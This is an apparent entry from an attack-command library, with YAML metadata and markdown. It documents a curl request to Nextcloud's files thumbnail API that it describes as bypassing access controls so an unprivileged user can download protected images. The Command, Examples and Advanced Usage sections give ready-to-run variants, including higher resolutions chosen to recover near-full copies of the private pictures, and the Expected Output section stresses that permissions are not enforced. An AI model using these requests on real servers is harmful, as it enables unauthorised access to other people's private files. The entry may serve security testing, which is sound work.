---
id: cmd-uuid-2
data: >-
  curl -u user
  'https://example.com/index.php/apps/files/api/v1/thumbnail/1212/750/Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg'
  -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Picture.jpeg
tags:
  - api
  - thumbnail
  - image
type: command
output: High-resolution JPEG image
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:58.692Z'
verified: false
validated: true
submitted: true
---
# thumbnail-image-curl

## Command

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/1212/750/Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg' -H 'Content-Type: application/x-www-form-urlencoded' > Secret_Picture.jpeg
```

## Description

This command fetches a high-resolution thumbnail of a protected image file via Nextcloud's files API as an unprivileged user, bypassing access controls to download the full or near-full image contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Username for auth | Yes |
| URL | API endpoint with width/height and encoded file path | Yes |
| `-H` | Content-Type header for form-urlencoded | Yes |
| `>` | Output redirection to local file | Yes |

## Examples

### Basic Usage

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/1024/768/path/to/image.jpg' -H 'Content-Type: application/x-www-form-urlencoded' > image.jpg
```

### Advanced Usage

Increase resolution for better quality: /thumbnail/2048/2048/...

```bash
curl -u user 'https://example.com/index.php/apps/files/api/v1/thumbnail/2048/2048/Secret_Folder/image.jpg' -H 'Content-Type: application/x-www-form-urlencoded' > high_res.jpg
```

## Expected Output

Binary JPEG file (Secret_Picture.jpeg) containing the image at specified resolution, potentially the full protected contents without permission enforcement.

## Related

- [[Related Procedure: Access-Protected-File-Thumbnails-via-API]]
